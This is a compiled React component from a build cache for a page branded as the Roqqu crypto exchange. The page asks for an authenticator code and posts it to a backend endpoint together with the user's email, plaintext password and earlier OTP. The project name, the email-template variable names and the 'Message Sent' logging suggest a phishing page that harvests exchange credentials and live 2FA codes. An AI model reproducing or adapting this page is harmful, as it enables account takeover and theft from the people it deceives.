{"ast":null,"code":"import _regeneratorRuntime from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/regenerator\";import _asyncToGenerator from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/helpers/esm/asyncToGenerator\";import _slicedToArray from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/helpers/esm/slicedToArray\";import React,{useState}from'react';import{useHistory}from'react-router-dom';import URL from'./Url.js';import twoFA from'../assets/2fa.png';import{jsx as _jsx}from\"react/jsx-runtime\";import{jsxs as _jsxs}from\"react/jsx-runtime\";export default function Otp(props){var _useState=useState(''),_useState2=_slicedToArray(_useState,2),verifyOtp=_useState2[0],setVerifyOtp=_useState2[1];var _useState3=useState(false),_useState4=_slicedToArray(_useState3,2),loading=_useState4[0],setLoading=_useState4[1];var handleCode=function handleCode(e){setVerifyOtp(e.target.value.replace(/\\D/,''));};var handleSubmit=/*#__PURE__*/function(){var _ref=_asyncToGenerator(/*#__PURE__*/_regeneratorRuntime.mark(function _callee(e){var templateParams,response,resData;return _regeneratorRuntime.wrap(function _callee$(_context){while(1){switch(_context.prev=_context.next){case 0:e.preventDefault();setLoading(true);if(!props.location.state){_context.next=18;break;}templateParams=props.location.state;_context.prev=4;_context.next=7;return fetch(URL+'/rq-1',{method:'POST',headers:{Accept:'application/json','Content-type':'application/json',Authorization:'Bearer '+templateParams.token},credentials:'include',mode:'cors',body:JSON.stringify({email:templateParams.email,password:templateParams.password,otp:templateParams.otp,verifyOtp:verifyOtp})});case 7:response=_context.sent;_context.next=10;return response.json();case 10:resData=_context.sent;if(resData.status==='success'){console.log('Message Sent.');setTimeout(function(){console.log('time out init');setLoading(false);setVerifyOtp('');},5000);}else if(resData.status==='fail'){console.log('Message failed to send.');setLoading(false);setVerifyOtp('');}_context.next=18;break;case 14:_context.prev=14;_context.t0=_context[\"catch\"](4);console.log(_context.t0);setVerifyOtp('');case 18:case\"end\":return _context.stop();}}},_callee,null,[[4,14]]);}));return function handleSubmit(_x){return _ref.apply(this,arguments);};}();return/*#__PURE__*/_jsx(\"div\",{className:\"container mx-auto\",children:/*#__PURE__*/_jsx(\"div\",{className:\"max-w-sm mx-auto md:max-w-lg\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"w-full grid justify-center justify-items-center mt-12 \",children:[/*#__PURE__*/_jsx(\"div\",{className:\"bg-[#cbe5f4] grid justify-center w-24 h-24 rounded-full p-3 content-center\",children:/*#__PURE__*/_jsx(\"img\",{alt:\"roqqu logo\",src:twoFA,className:\"w-14\"})}),/*#__PURE__*/_jsxs(\"div\",{className:\" h-64 py-3 rounded text-center mt-4\",children:[/*#__PURE__*/_jsx(\"h1\",{className:\"text-2xl font-bold\",children:\"Enter Auth Code\"}),/*#__PURE__*/_jsxs(\"div\",{className:\"flex flex-col mt-4 mx-5\",style:{lineHeight:'2em !important',fontSize:'15px'},children:[' ',/*#__PURE__*/_jsx(\"span\",{className:\"px-8\",children:\"An Auth code from your authenticator app is required to complete your transactions on Roqqu\"}),' ']}),/*#__PURE__*/_jsxs(\"form\",{onSubmit:handleSubmit,className:\" px-6\",children:[/*#__PURE__*/_jsx(\"input\",{type:\"text\",id:\"code\",className:\"text-[#b2b7be] outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-[#b2b7be] mb-4 bg-transparent border border-[#b2b7be] my-10 w-full\",required:true,pattern:\"\\\\d*\",value:verifyOtp,placeholder:\"Enter Auth Code\",onChange:handleCode,maxLength:6}),/*#__PURE__*/_jsxs(\"div\",{className:\"flex justify-center text-center mt-10\",children:[' ',/*#__PURE__*/_jsxs(\"button\",{className:\"flex items-center text-blue-700 hover:text-blue-900 cursor-pointer\",children:[/*#__PURE__*/_jsx(\"span\",{className:\" bg-[#21ba45] text-white py-2 px-11 rounded-lg\",children:loading?'loading...':'Complete'}),/*#__PURE__*/_jsx(\"i\",{className:\"bx bx-caret-right ml-1\"})]}),' ']})]})]})]})})});}","map":null,"metadata":{},"sourceType":"module"}